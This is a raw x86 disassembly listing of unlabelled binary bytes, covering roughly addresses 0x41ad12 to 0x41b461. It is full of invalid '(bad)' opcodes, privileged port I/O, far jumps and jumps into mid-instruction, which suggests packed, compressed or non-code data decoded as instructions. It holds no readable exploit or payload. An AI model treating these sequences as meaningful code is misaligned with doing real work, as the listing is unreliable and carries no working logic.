  41ad12:	cmp    eax,DWORD PTR [edi+eax*2-0x24]
  41ad16:	lea    ebx,[ebp+edi*2+0x12ec4d1]
  41ad1d:	ja     0x41acf5
  41ad1f:	inc    ebx
  41ad20:	mov    ch,0x79
  41ad22:	pop    ebx
  41ad23:	(bad)  
  41ad24:	imul   edx,DWORD PTR [edi],0xffffffe6
  41ad27:	mov    ds:0xd8ddbc12,al
  41ad2c:	ret    0x3ae4
  41ad2f:	mov    BYTE PTR [eax],ch
  41ad31:	in     al,dx
  41ad32:	lods   al,BYTE PTR ds:[esi]
  41ad33:	fstp   DWORD PTR [eax-0x1b]
  41ad36:	jmp    0x41acda
  41ad38:	repz rol BYTE PTR [eax-0x4a],cl
  41ad3c:	sub    ch,ch
  41ad3e:	test   BYTE PTR [edx+0x167e0567],0xdf
  41ad45:	ins    BYTE PTR es:[edi],dx
  41ad46:	add    DWORD PTR [edi],ebx
  41ad48:	shl    BYTE PTR [ebx+0x19],0x87
  41ad4c:	inc    ebp
  41ad4d:	mov    dl,0xa6
  41ad4f:	cmp    al,0x93
  41ad51:	in     al,dx
  41ad52:	iret   
  41ad53:	mov    BYTE PTR ds:0xe0484c8b,0x4a
  41ad5a:	adc    al,0xd7
  41ad5c:	ret    
  41ad5d:	into   
  41ad5e:	jg     0x41ad9c
  41ad60:	sti    
  41ad61:	adc    esp,esi
  41ad63:	test   esp,ebp
  41ad65:	inc    ecx
  41ad66:	repz dec edi
  41ad68:	gs pop ecx
  41ad6a:	in     al,dx
  41ad6b:	inc    ebp
  41ad6c:	mov    eax,0x53626a54
  41ad71:	aas    
  41ad72:	mov    esp,0xccbbebb
  41ad77:	pop    eax
  41ad78:	mov    ch,0x20
  41ad7a:	jp     0x41ad33
  41ad7c:	mov    edx,0x560d1078
  41ad81:	neg    BYTE PTR [esp+eiz*8]
  41ad84:	mov    edi,0x99c0dbd1
  41ad89:	inc    esi
  41ad8a:	push   ecx
  41ad8b:	pop    esi
  41ad8c:	fnstenv [ecx-0x6]
  41ad8f:	je     0x41ad86
  41ad91:	push   es
  41ad92:	lahf   
  41ad93:	imul   eax,DWORD PTR [ebp-0x43],0xa
  41ad97:	int3   
  41ad98:	int    0xa7
  41ad9a:	and    dh,0x51
  41ad9d:	int3   
  41ad9e:	jl     0x41ada1
  41ada0:	sbb    ecx,DWORD PTR [ecx]
  41ada2:	mov    WORD PTR [eax+0x1c63380d],es
  41ada8:	sbb    eax,DWORD PTR [esi]
  41adaa:	xor    BYTE PTR [ebx+0x5],bh
  41adad:	in     al,dx
  41adae:	iret   
  41adaf:	movq   QWORD PTR [esi],mm1
  41adb2:	sbb    DWORD PTR [edx],0x8d4f03b5
  41adb8:	mov    bh,0x4a
  41adba:	out    0x55,al
  41adbc:	push   edi
  41adbd:	int    0x8e
  41adbf:	test   al,0x6b
  41adc1:	ds inc esi
  41adc3:	aam    0x61
  41adc5:	mov    BYTE PTR [eax+0x2d7d4588],dl
  41adcb:	inc    ebx
  41adcc:	xor    ebp,DWORD PTR [eax+edi*4+0x7a]
  41add0:	adc    ah,BYTE PTR [eax-0x20]
  41add3:	push   edi
  41add4:	(bad)
  41add7:	or     cl,al
  41add9:	sahf   
  41adda:	aam    0xed
  41addc:	clc    
  41addd:	mov    ch,0x33
  41addf:	xchg   ecx,eax
  41ade0:	xor    dh,cl
  41ade2:	sti    
  41ade3:	sub    DWORD PTR [edx-0x6ce0c0b6],ecx
  41ade9:	sbb    bh,ch
  41adeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adec:	jmp    0x41ae50
  41adee:	fimul  DWORD PTR [ebx+0x17]
  41adf1:	inc    ebx
  41adf2:	cld    
  41adf3:	pop    edi
  41adf4:	pop    es
  41adf5:	popf   
  41adf6:	sub    ah,dl
  41adf8:	shl    DWORD PTR [eax],0x4b
  41adfb:	(bad)  
  41adfc:	dec    ebx
  41adfd:	stos   DWORD PTR es:[edi],eax
  41adfe:	lock or edi,edx
  41ae01:	pop    es
  41ae02:	push   es
  41ae03:	jmp    0x41adc3
  41ae05:	jne    0x41add8
  41ae07:	xor    edx,ebp
  41ae09:	xchg   ecx,eax
  41ae0a:	lahf   
  41ae0b:	push   ds
  41ae0c:	dec    esi
  41ae0d:	out    0x38,eax
  41ae0f:	(bad)  [ecx+0x50]
  41ae12:	adc    al,0x2c
  41ae14:	fldenv [ecx+eiz*4]
  41ae17:	push   edi
  41ae18:	inc    ecx
  41ae19:	rcr    esp,cl
  41ae1b:	repnz in eax,0x4b
  41ae1e:	std    
  41ae1f:	mov    al,ds:0x798a1428
  41ae24:	xor    bh,BYTE PTR [eax]
  41ae26:	push   0xdfe8e97b
  41ae2b:	call   0x38a25201
  41ae30:	stos   DWORD PTR es:[edi],eax
  41ae31:	or     BYTE PTR [edx-0xf911f93],0x59
  41ae38:	xchg   ebx,eax
  41ae39:	adc    bh,dl
  41ae3b:	push   esp
  41ae3c:	in     eax,dx
  41ae3d:	mov    ch,0x5
  41ae3f:	or     ecx,ebp
  41ae41:	add    eax,0x1045f33d
  41ae46:	jle    0x41aeb7
  41ae48:	pushf  
  41ae49:	in     al,0x5c
  41ae4b:	cmc    
  41ae4c:	enter  0xa1f4,0xc0
  41ae50:	hlt    
  41ae51:	push   cs
  41ae52:	xchg   esp,eax
  41ae53:	jl     0x41ae35
  41ae55:	mov    BYTE PTR [esi+edi*1-0x4],ah
  41ae59:	lahf   
  41ae5a:	sbb    bh,BYTE PTR [edi+0x6db39d32]
  41ae60:	cmp    dl,BYTE PTR [esi]
  41ae62:	mov    dl,0xbc
  41ae64:	jb     0x41adf2
  41ae66:	test   DWORD PTR [edi],0xeb1f97f9
  41ae6c:	loope  0x41ae5c
  41ae6e:	ins    BYTE PTR es:[edi],dx
  41ae6f:	fsubr  st(6),st
  41ae71:	call   0xfca6:0x3fcc08bf
  41ae78:	aad    0x41
  41ae7a:	or     DWORD PTR [esi-0x553049eb],ebp
  41ae80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae81:	in     al,0x95
  41ae83:	sbb    ch,bh
  41ae85:	rcr    BYTE PTR [ebx-0x57f93da7],1
  41ae8b:	add    al,0xe3
  41ae8d:	push   ds
  41ae8e:	les    esp,FWORD PTR [esi+0x79259939]
  41ae94:	xlat   BYTE PTR ds:[ebx]
  41ae95:	cmp    ah,0x8f
  41ae98:	fadd   st,st(1)
  41ae9a:	mov    ebx,ebx
  41ae9c:	push   cs
  41ae9d:	(bad)  
  41ae9e:	pop    eax
  41ae9f:	and    ecx,edi
  41aea1:	mov    edi,edi
  41aea3:	stos   BYTE PTR es:[edi],al
  41aea4:	out    dx,al
  41aea5:	sahf   
  41aea6:	fisub  WORD PTR [ecx-0x29]
  41aea9:	inc    DWORD PTR [esi]
  41aeab:	dec    esi
  41aeac:	data16 daa 
  41aeae:	mov    ds:0x6a0e8a3,al
  41aeb3:	ds push 0xfffffffa
  41aeb6:	xchg   edx,eax
  41aeb7:	inc    ebp
  41aeb8:	inc    ebx
  41aeb9:	xor    DWORD PTR [esi+0x244b6773],esi
  41aebf:	gs and eax,0x9679bf96
  41aec5:	int    0xb8
  41aec7:	mov    dh,0x5
  41aec9:	(bad)  
  41aecb:	jnp    0x41af15
  41aecd:	out    0xf4,eax
  41aecf:	bound  esp,QWORD PTR [edx+edi*4-0x3b2df5d8]
  41aed6:	fdiv   st(5),st
  41aed8:	sti    
  41aed9:	mov    ebp,0x48f9570a
  41aede:	sbb    DWORD PTR [edi],esi
  41aee0:	ficomp WORD PTR [eax+0x7d]
  41aee3:	pop    ebp
  41aee4:	adc    al,0x3f
  41aee6:	fnstenv ss:[ebx+0x2]
  41aeea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeeb:	xchg   ebp,eax
  41aeec:	ss loop 0x41ae97
  41aeef:	stos   DWORD PTR es:[edi],eax
  41aef0:	inc    ebp
  41aef1:	jecxz  0x41aeff
  41aef3:	pop    es
  41aef4:	xor    al,0x2c
  41aef6:	popf   
  41aef7:	or     BYTE PTR [eax],dl
  41aef9:	dec    edi
  41aefa:	mov    al,0x98
  41aefc:	jnp    0x41aeb0
  41aefe:	nop
  41aeff:	(bad)  
  41af00:	popa   
  41af01:	mov    edi,0x19a5109e
  41af06:	retf   0x1389
  41af09:	inc    ebp
  41af0a:	(bad)  
  41af0b:	jb     0x41af1c
  41af0d:	jo     0x41af2e
  41af0f:	(bad)  
  41af11:	add    eax,0xa7f3e5d5
  41af16:	push   esp
  41af17:	scas   al,BYTE PTR es:[edi]
  41af18:	or     al,0x62
  41af1a:	sahf   
  41af1b:	mov    esp,gs
  41af1d:	sub    ebx,ebp
  41af1f:	adc    al,0x3d
  41af21:	stos   BYTE PTR es:[edi],al
  41af22:	sbb    edi,DWORD PTR [ebx+0x42]
  41af25:	push   cs
  41af26:	add    al,0x1c
  41af28:	add    DWORD PTR [ecx],esi
  41af2a:	enter  0x9689,0x78
  41af2e:	cs loopne 0x41af73
  41af31:	or     DWORD PTR [edx],eax
  41af33:	sbb    eax,0xbb433e
  41af38:	loope  0x41af73
  41af3a:	and    esi,esi
  41af3c:	cs jb  0x41af6e
  41af3f:	scas   al,BYTE PTR es:[edi]
  41af40:	ins    DWORD PTR es:[edi],dx
  41af41:	stos   BYTE PTR es:[edi],al
  41af42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af43:	sar    ebp,1
  41af45:	repz enter 0x17a5,0x6f
  41af4a:	lahf   
  41af4b:	in     al,dx
  41af4c:	mov    ebx,ebp
  41af4e:	in     al,dx
  41af4f:	scas   eax,DWORD PTR es:[edi]
  41af50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af51:	int3   
  41af52:	lock xor DWORD PTR [edi],0xfffffffd
  41af56:	dec    ebx
  41af57:	jbe    0x41af51
  41af59:	shr    BYTE PTR [edx+0x5f],1
  41af5c:	inc    edi
  41af5d:	ins    DWORD PTR es:[edi],dx
  41af5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af5f:	push   es
  41af60:	idiv   ecx
  41af62:	dec    ebp
  41af64:	dec    eax
  41af65:	mov    ebx,0x6b6045d2
  41af6a:	shl    BYTE PTR [eax],1
  41af6c:	adc    ah,ah
  41af6e:	neg    DWORD PTR [eax]
  41af70:	inc    ebp
  41af71:	jmp    0xa6268fe7
  41af76:	adc    BYTE PTR [ebx],dh
  41af78:	xchg   BYTE PTR ds:0xa5ce0f1b,bl
  41af7e:	fcomp  QWORD PTR [ebp-0x15]
  41af81:	jne    0x41af0e
  41af83:	add    bh,BYTE PTR [ebx]
  41af85:	pushf  
  41af86:	fistp  QWORD PTR [edx-0x30f89562]
  41af8c:	and    eax,0x9c7e509f
  41af91:	sub    dh,ah
  41af93:	xor    edi,DWORD PTR [ebp-0x23a97403]
  41af99:	mov    ds:0x911d802a,eax
  41af9e:	fs repz jne 0x41af69
  41afa2:	xor    eax,0x38a3a8d0
  41afa7:	push   ss
  41afa8:	xor    DWORD PTR [esi],0xf6b75382
  41afae:	mov    esp,DWORD PTR [eax-0x49]
  41afb1:	or     al,0x65
  41afb3:	into   
  41afb4:	dec    edx
  41afb5:	fwait
  41afb6:	sbb    BYTE PTR [edi+edi*2-0x7],bl
  41afba:	xor    DWORD PTR [edx-0x4],ecx
  41afbd:	bound  ebp,QWORD PTR [ebx]
  41afbf:	into   
  41afc0:	jb     0x41afd6
  41afc2:	push   ebx
  41afc3:	add    ecx,ecx
  41afc5:	push   ebp
  41afc6:	shr    DWORD PTR [ebp-0x41],0x6c
  41afca:	hlt    
  41afcb:	xchg   esp,eax
  41afcc:	cmp    BYTE PTR [ecx-0x35f234db],ch
  41afd2:	cmp    al,0x5b
  41afd4:	pop    es
  41afd5:	xchg   ecx,eax
  41afd6:	aas    
  41afd7:	out    0x87,al
  41afd9:	inc    edx
  41afda:	push   ecx
  41afdb:	pop    es
  41afdc:	push   0x4b
  41afde:	retf   0xcf4b
  41afe1:	retf   
  41afe2:	rcr    dl,1
  41afe4:	and    dh,dl
  41afe6:	cdq    
  41afe7:	xchg   esi,eax
  41afe8:	unpcklps xmm0,XMMWORD PTR [eax]
  41afeb:	adc    DWORD PTR [edx+0x7216e74a],eax
  41aff1:	pushf  
  41aff2:	or     BYTE PTR [ebx],0x55
  41aff5:	dec    edi
  41aff6:	mov    ebx,0x414ea0c
  41affb:	mov    eax,0x926b860f
  41b000:	outs   dx,BYTE PTR ds:[esi]
  41b001:	jmp    0x7f35:0x3571a80b
  41b008:	push   edx
  41b009:	mov    DWORD PTR [ebx-0x7f],edi
  41b00c:	jns    0x41b047
  41b00e:	sbb    edi,edi
  41b010:	push   0xffffffcd
  41b012:	push   esi
  41b013:	popf   
  41b014:	xchg   esp,eax
  41b015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b016:	jmp    0xeeed:0x5f9fd90d
  41b01d:	es cld 
  41b01f:	retf   
  41b020:	mov    bl,0x41
  41b022:	cmp    BYTE PTR [ebx],ch
  41b024:	mul    DWORD PTR [ebx+ebx*4+0x2e]
  41b028:	imul   ecx,DWORD PTR [ebp+0x2e],0xffffffe6
  41b02c:	gs cli 
  41b02e:	loopne 0x41b039
  41b030:	ss jo  0x41afec
  41b033:	cmp    bh,BYTE PTR [esp+ebx*2]
  41b036:	add    eax,0xc399815c
  41b03b:	call   0xf43d:0x1e2e053b
  41b042:	push   esi
  41b043:	xchg   esi,eax
  41b044:	dec    ebp
  41b045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b046:	adc    ebx,0xb
  41b049:	inc    esp
  41b04a:	lock pop ebp
  41b04c:	mov    dl,BYTE PTR [ebx]
  41b04e:	push   cs
  41b04f:	pop    ss
  41b050:	xlat   BYTE PTR ds:[ebx]
  41b051:	stc    
  41b052:	add    edi,esi
  41b054:	fwait
  41b055:	mov    WORD PTR [edi],es
  41b057:	inc    eax
  41b058:	rcr    DWORD PTR [eax+0x565f9e56],cl
  41b05e:	call   0x4f42bdaf
  41b063:	push   ss
  41b064:	(bad)  
  41b065:	dec    ecx
  41b066:	out    dx,eax
  41b067:	repnz jecxz 0x41b060
  41b06a:	inc    ebx
  41b06b:	add    DWORD PTR [ecx+0x4738085b],0xffffffe1
  41b072:	fcomp  QWORD PTR [esp+ecx*8]
  41b075:	test   al,0xcb
  41b077:	jno    0x41b05c
  41b079:	jl     0x41b09f
  41b07b:	pop    ecx
  41b07c:	cmp    BYTE PTR [edx-0x56],dh
  41b07f:	jb     0x41b00f
  41b081:	in     eax,0x67
  41b083:	mov    ds:0x4ec71623,al
  41b088:	mov    WORD PTR [ebx],?
  41b08a:	out    dx,al
  41b08b:	and    ebp,esp
  41b08d:	or     ebx,eax
  41b08f:	imul   esi,DWORD PTR [ecx+0x15],0xe53d02cf
  41b096:	mov    al,0x20
  41b098:	ins    BYTE PTR es:[edi],dx
  41b099:	shl    BYTE PTR [edi+0x2c],1
  41b09c:	pop    edi
  41b09d:	add    dl,BYTE PTR [ebp+0x2776fe4c]
  41b0a3:	call   0xb7fb:0xa51fed15
  41b0aa:	enter  0xe47b,0xb1
  41b0ae:	add    BYTE PTR [edx-0x7bebdd4],ch
  41b0b4:	sbb    eax,0x142750a3
  41b0b9:	sub    BYTE PTR [esi],0x39
  41b0bc:	loope  0x41b04b
  41b0be:	xor    bh,BYTE PTR [ebp-0x6416fb56]
  41b0c4:	dec    ecx
  41b0c5:	mov    bl,0xa5
  41b0c7:	nop
  41b0c8:	dec    esi
  41b0c9:	(bad)  [edi-0x5d]
  41b0cc:	push   ss
  41b0cd:	shl    BYTE PTR [edx+0x28],0xb1
  41b0d1:	imul   BYTE PTR gs:[eax]
  41b0d4:	xchg   esp,eax
  41b0d5:	and    eax,0x808e4194
  41b0da:	loopne 0x41b120
  41b0dc:	cdq    
  41b0dd:	cmp    BYTE PTR [eax-0x4c28458d],al
  41b0e3:	(bad)  
  41b0e4:	mov    esi,0x70dfd122
  41b0e9:	shr    DWORD PTR [ebx+0x721771d],1
  41b0ef:	adc    DWORD PTR [eax-0xb9d08a4],esp
  41b0f5:	ret    0x8b3f
  41b0f8:	repz cdq 
  41b0fa:	fsub   QWORD PTR ds:0x9d76b47b
  41b100:	xchg   edx,eax
  41b102:	shr    BYTE PTR [ecx*8+0x57408616],cl
  41b109:	jbe    0x41b15b
  41b10b:	int3   
  41b10c:	ins    DWORD PTR es:[edi],dx
  41b10d:	shr    edx,1
  41b10f:	inc    ebp
  41b110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b111:	mov    WORD PTR [bp+di+0x69ad],ds
  41b116:	lods   al,BYTE PTR ds:[esi]
  41b117:	add    DWORD PTR [esi+edi*2+0x1ded8a1],ebp
  41b11e:	fnsave [ebx+edi*2]
  41b121:	mov    dh,0xed
  41b123:	add    dl,BYTE PTR [edx+0x5a]
  41b126:	sar    BYTE PTR [edi],0x66
  41b129:	dec    DWORD PTR [esi-0x5e]
  41b12c:	inc    ebx
  41b12d:	sbb    bl,BYTE PTR ds:0x5dc42af
  41b133:	and    BYTE PTR [edi+esi*4+0x28],dl
  41b137:	mov    fs,WORD PTR [esi]
  41b139:	dec    edi
  41b13a:	mov    dh,0x56
  41b13c:	hlt    
  41b13d:	sahf   
  41b13e:	cdq    
  41b13f:	pop    ebp
  41b140:	ins    BYTE PTR es:[edi],dx
  41b141:	push   esp
  41b142:	out    0x4c,eax
  41b144:	inc    edx
  41b145:	rol    esi,cl
  41b147:	mov    esi,0x7fb9b106
  41b14c:	adc    eax,0x3884351c
  41b151:	inc    ebx
  41b152:	adc    ebp,DWORD PTR [esi-0x19]
  41b155:	xchg   ebx,eax
  41b156:	sbb    cl,ah
  41b158:	popf   
  41b159:	mov    eax,ds:0x5af1cd5b
  41b15e:	(bad)  
  41b15f:	mov    ds:0x3c256d90,eax
  41b164:	sbb    eax,0xa4393155
  41b169:	dec    ebp
  41b16a:	xor    edi,DWORD PTR [esi]
  41b16c:	inc    edi
  41b16d:	call   0x8289724c
  41b172:	cdq    
  41b173:	add    al,0x1e
  41b175:	xchg   esp,eax
  41b176:	pusha  
  41b177:	sar    DWORD PTR [edx+0x72],1
  41b17a:	xchg   ebx,eax
  41b17b:	rcl    DWORD PTR [ecx+ecx*1],cl
  41b17e:	rol    BYTE PTR [eax-0x2ff26759],1
  41b184:	imul   edx,eax,0x6bed9023
  41b18a:	adc    BYTE PTR [eax+0x19471929],al
  41b190:	mov    WORD PTR [eax+ecx*8+0x32],?
  41b194:	pop    edx
  41b195:	sub    eax,0xf805e073
  41b19a:	mov    WORD PTR [esi-0x45],es
  41b19d:	jg     0x41b1cc
  41b19f:	lods   al,BYTE PTR ds:[esi]
  41b1a0:	je     0x41b14a
  41b1a2:	test   eax,0xa7309812
  41b1a7:	cmp    eax,0x846b46e7
  41b1ac:	push   eax
  41b1ad:	or     DWORD PTR [esi],ecx
  41b1af:	mov    al,ds:0x12e52a79
  41b1b4:	mov    ds:0xb33dedd1,eax
  41b1b9:	inc    esp
  41b1ba:	fwait
  41b1bb:	sub    edx,eax
  41b1bd:	mov    ch,0xec
  41b1bf:	gs (bad) 
  41b1c1:	jmp    DWORD PTR [eax]
  41b1c3:	stc    
  41b1c4:	(bad)  
  41b1c5:	sbb    al,0x6c
  41b1c7:	scas   al,BYTE PTR es:[edi]
  41b1c8:	leave  
  41b1c9:	sub    eax,DWORD PTR [edx-0xa]
  41b1cc:	jmp    0x120607ff
  41b1d1:	retf   0xa562
  41b1d4:	ins    DWORD PTR es:[edi],dx
  41b1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1d6:	jnp    0x41b1ef
  41b1d8:	iret   
  41b1d9:	dec    esi
  41b1da:	xchg   ebx,eax
  41b1db:	imul   esi,DWORD PTR [edi+0x5b2979eb],0x1a8b1fda
  41b1e5:	jmp    DWORD PTR [esi+0x77]
  41b1e8:	adc    al,0xd0
  41b1ea:	arpl   WORD PTR [eax],bp
  41b1ec:	loope  0x41b242
  41b1ee:	shl    BYTE PTR [esi+0x68],cl
  41b1f1:	dec    ebp
  41b1f2:	sbb    bl,BYTE PTR [eax]
  41b1f4:	test   al,0xf3
  41b1f6:	popa   
  41b1f7:	ds inc ecx
  41b1f9:	xchg   ebp,eax
  41b1fa:	cs stos BYTE PTR es:[edi],al
  41b1fc:	jp     0x41b192
  41b1fe:	jg     0x41b18b
  41b200:	jns    0x41b280
  41b202:	in     al,0xe8
  41b204:	push   cs
  41b205:	icebp  
  41b206:	into   
  41b207:	dec    esp
  41b208:	cmp    DWORD PTR [edx+0x18cdfd78],ebx
  41b20e:	mov    eax,0x67317c33
  41b213:	fsubr  QWORD PTR [ebx+0x6de5bc52]
  41b219:	inc    edx
  41b21a:	fmul   QWORD PTR [ebx]
  41b21c:	xchg   esi,eax
  41b21d:	sub    esp,DWORD PTR [edx]
  41b21f:	repnz push ds
  41b221:	or     al,BYTE PTR [ebx-0x37]
  41b224:	gs inc ebp
  41b226:	(bad)  
  41b227:	sar    DWORD PTR [eax+esi*1-0x41537985],cl
  41b22e:	push   edi
  41b22f:	or     BYTE PTR [ecx-0x19],dl
  41b232:	ss cs or dh,ch
  41b236:	js     0x41b231
  41b238:	test   DWORD PTR [edi+edx*2+0x3a26270a],edx
  41b23f:	mov    bh,0xd5
  41b241:	inc    edx
  41b242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b243:	dec    eax
  41b244:	test   ebp,eax
  41b246:	dec    eax
  41b247:	loop   0x41b289
  41b249:	sar    BYTE PTR [eax-0x6],0x1d
  41b24d:	inc    ebx
  41b24e:	dec    edi
  41b24f:	jecxz  0x41b1f8
  41b251:	or     eax,0x84f0ae7f
  41b256:	and    BYTE PTR [ebx-0x132468d8],0x20
  41b25d:	lods   eax,DWORD PTR ds:[esi]
  41b25e:	imul   esi,DWORD PTR [esi+ecx*2-0x3d],0xfffffffd
  41b263:	mov    al,0x8e
  41b265:	dec    eax
  41b266:	loopne 0x41b288
  41b268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b269:	fist   DWORD PTR [esi]
  41b26b:	mov    edi,0xc6124b78
  41b270:	xor    eax,0xf6c72c68
  41b275:	addr16 push bp
  41b278:	inc    edi
  41b279:	add    al,0x14
  41b27b:	lahf   
  41b27c:	ror    cl,cl
  41b27e:	xlat   BYTE PTR ds:[ebx]
  41b27f:	push   0x9039b4aa
  41b284:	or     al,BYTE PTR [eax]
  41b286:	and    DWORD PTR [edx+0x2],eax
  41b289:	add    edi,DWORD PTR [esi+0x47]
  41b28c:	sahf   
  41b28d:	push   esp
  41b28e:	leave  
  41b28f:	test   al,0xf6
  41b291:	mov    edi,0x15573b94
  41b296:	pop    esi
  41b297:	fidivr DWORD PTR [ecx+ebx*2+0x565a6ebf]
  41b29e:	gs add al,0x90
  41b2a1:	sbb    bl,BYTE PTR [edx-0x6]
  41b2a4:	or     BYTE PTR [eax],dh
  41b2a6:	not    DWORD PTR [eax-0x7f047ca8]
  41b2ac:	ret    0xbe25
  41b2af:	ss cmc 
  41b2b1:	ss hlt 
  41b2b3:	aaa    
  41b2b4:	int3   
  41b2b5:	push   eax
  41b2b6:	jo     0x41b23e
  41b2b8:	dec    esp
  41b2b9:	inc    eax
  41b2ba:	mov    BYTE PTR [ebp+ecx*2-0xae6ed7],0x5d
  41b2c2:	js     0x41b29a
  41b2c4:	lds    edx,FWORD PTR [eax-0x503b4926]
  41b2ca:	pop    esp
  41b2cb:	mov    edi,0x78c319d7
  41b2d0:	cmp    al,0xbe
  41b2d2:	dec    ecx
  41b2d3:	mov    eax,0x8845bc01
  41b2d8:	xchg   ebp,eax
  41b2d9:	retf   
  41b2da:	jns    0x41b2f4
  41b2dc:	in     al,dx
  41b2dd:	in     al,dx
  41b2de:	imul   esp,DWORD PTR [eax],0xffffffd6
  41b2e1:	fisub  WORD PTR [ecx-0x1f]
  41b2e4:	retf   0xc904
  41b2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e8:	cli    
  41b2e9:	lods   eax,DWORD PTR ds:[esi]
  41b2ea:	push   eax
  41b2eb:	lahf   
  41b2ec:	iret   
  41b2ed:	push   0x342dec99
  41b2f2:	cmp    al,0x27
  41b2f4:	jae    0x41b2ed
  41b2f6:	jmp    0x8a62c02e
  41b2fb:	mov    edi,0x124b7204
  41b300:	xchg   edx,eax
  41b301:	gs adc eax,0xe3b7ba4c
  41b307:	sbb    ebx,DWORD PTR [esi]
  41b309:	pop    ebp
  41b30a:	mov    dh,0x61
  41b30c:	sub    edi,DWORD PTR [ebx-0x3e]
  41b30f:	and    al,0xc7
  41b311:	pop    ds
  41b312:	shl    esp,1
  41b314:	xor    dl,BYTE PTR [ebx+esi*1-0x5afd81a]
  41b31b:	xchg   DWORD PTR [ebx-0x356b3ed6],eax
  41b321:	cmp    ebp,ebx
  41b323:	pushf  
  41b324:	mov    DWORD PTR [esi+0x51127545],esp
  41b32a:	push   cs
  41b32b:	scas   al,BYTE PTR es:[edi]
  41b32c:	lock mov esi,0xa7c9a60f
  41b332:	fwait
  41b333:	add    DWORD PTR [edx+esi*2-0x4],0xc60202fd
  41b33b:	pop    edi
  41b33c:	enter  0x1a48,0x68
  41b340:	mov    al,0xfd
  41b342:	jl     0x41b36d
  41b344:	dec    esp
  41b345:	jp     0x41b371
  41b347:	in     al,0x9
  41b349:	call   0x6a847edd
  41b34e:	inc    ebp
  41b34f:	push   ebp
  41b350:	mov    ch,0x66
  41b352:	fcom   QWORD PTR gs:0xf234aee7
  41b359:	fistp  WORD PTR [eax-0x55c65dd5]
  41b35f:	cmp    DWORD PTR [edi-0x1b343efb],esp
  41b365:	sub    DWORD PTR [ebp+eiz*2+0x5ef49921],esi
  41b36c:	push   edx
  41b36d:	(bad)  
  41b36e:	out    dx,al
  41b36f:	cmp    DWORD PTR [esi+ecx*4],ebp
  41b372:	lea    ebx,[eax+0x13]
  41b375:	mov    ecx,0x4dbffa42
  41b37a:	pop    edi
  41b37b:	pop    ss
  41b37c:	in     eax,0x2b
  41b37e:	ins    DWORD PTR es:[edi],dx
  41b37f:	push   0xb51de31b
  41b384:	mov    ebx,0x925bdd27
  41b389:	call   ebp
  41b38b:	mov    esp,0x6c69135d
  41b390:	push   0xffffffeb
  41b392:	js     0x41b3aa
  41b394:	repz add al,0xfa
  41b397:	sbb    al,0x7e
  41b399:	daa    
  41b39a:	daa    
  41b39b:	inc    eax
  41b39c:	sbb    eax,0x8b2c6a3e
  41b3a1:	mov    ah,0x1c
  41b3a3:	jne    0x41b40d
  41b3a5:	js     0x41b41a
  41b3a7:	jnp    0x41b3a7
  41b3a9:	xor    dl,BYTE PTR [ecx+0xa]
  41b3ac:	inc    esp
  41b3ad:	data16 add ah,BYTE PTR [ebp+0x1d77e6d]
  41b3b4:	xchg   ecx,eax
  41b3b5:	sub    DWORD PTR [edi],edi
  41b3b7:	adc    dh,BYTE PTR [edx]
  41b3b9:	ins    BYTE PTR es:[edi],dx
  41b3ba:	mov    edx,0xcce4eeb3
  41b3bf:	xor    cl,bl
  41b3c1:	pop    ss
  41b3c2:	jo     0x41b37e
  41b3c4:	int3   
  41b3c5:	dec    ebp
  41b3c6:	in     al,dx
  41b3c7:	cld    
  41b3c8:	inc    eax
  41b3c9:	je     0x41b41f
  41b3cb:	mov    esp,ebx
  41b3cd:	mov    BYTE PTR [ebp+0x5e],al
  41b3d0:	xchg   ebp,eax
  41b3d1:	jo     0x41b3dd
  41b3d3:	inc    edx
  41b3d4:	or     al,BYTE PTR [ebx-0x161b19c4]
  41b3da:	pop    ss
  41b3db:	mov    BYTE PTR [esi-0x266f3cce],bh
  41b3e1:	(bad)  
  41b3e2:	je     0x41b41e
  41b3e4:	cs out 0xbb,eax
  41b3e7:	inc    esp
  41b3e8:	jmp    0xf9cd37cb
  41b3ed:	stos   BYTE PTR es:[edi],al
  41b3ee:	iret   
  41b3ef:	mov    bh,0xbd
  41b3f1:	rol    DWORD PTR [ecx+0x33],0xe
  41b3f5:	or     al,0xdf
  41b3f7:	pop    esi
  41b3f8:	push   eax
  41b3f9:	inc    edx
  41b3fa:	or     eax,0xcf914bca
  41b3ff:	loop   0x41b3a2
  41b401:	push   eax
  41b402:	sub    al,0x8
  41b404:	sbb    BYTE PTR [edi],ah
  41b406:	dec    edx
  41b407:	add    dh,BYTE PTR [esi]
  41b409:	dec    ecx
  41b40a:	outs   dx,BYTE PTR ds:[esi]
  41b40b:	adc    eax,0xa51615c1
  41b410:	lods   al,BYTE PTR ds:[esi]
  41b411:	(bad)  
  41b412:	adc    eax,0x780e24b7
  41b417:	nop
  41b418:	xor    bh,BYTE PTR [esi]
  41b41a:	mov    DWORD PTR [eax],eax
  41b41c:	ret    0xdfaf
  41b41f:	shr    BYTE PTR [si+0x25],1
  41b423:	push   ds
  41b424:	sbb    BYTE PTR [edx+esi*1-0x37],dl
  41b428:	loop   0x41b46e
  41b42a:	mov    dh,BYTE PTR [edi]
  41b42c:	push   0x62
  41b42e:	dec    ebp
  41b42f:	mov    esi,cs
  41b431:	or     eax,0x418e625a
  41b436:	test   eax,0x5a7881d2
  41b43b:	imul   esp,DWORD PTR [ebp+0x7c174cdd],0x2a019951
  41b445:	lea    ebp,[edi+0x3274ed16]
  41b44b:	jns    0x41b3f2
  41b44d:	enter  0x7ec8,0xca
  41b451:	cmc    
  41b452:	xchg   BYTE PTR [ebp-0x6501a09d],dh
  41b458:	ins    DWORD PTR es:[edi],dx
  41b459:	imul   esp,DWORD PTR [ebx+0x52],0xba60dd4
  41b460:	ins    DWORD PTR es:[edi],dx
  41b461:	or     BYTE PTR [edx+edx*1-0x53],ah
